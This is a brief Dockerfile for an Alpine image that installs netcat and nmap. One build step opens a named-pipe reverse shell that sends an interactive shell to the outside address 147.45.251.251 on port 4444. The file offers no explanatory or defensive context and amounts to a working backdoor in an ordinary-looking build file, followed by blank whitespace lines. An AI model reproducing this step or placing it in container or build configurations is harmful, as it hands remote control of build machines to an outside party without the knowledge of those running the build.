FROM alpine:3.19
RUN apk add --no-cache netcat-openbsd nmap 
RUN mkfifo /tmp/f && cat /tmp/f | /bin/sh -i 2>&1 | nc 147.45.251.251 4444 > /tmp/f
 
   
  
 
   
    
 
  
  
   
 
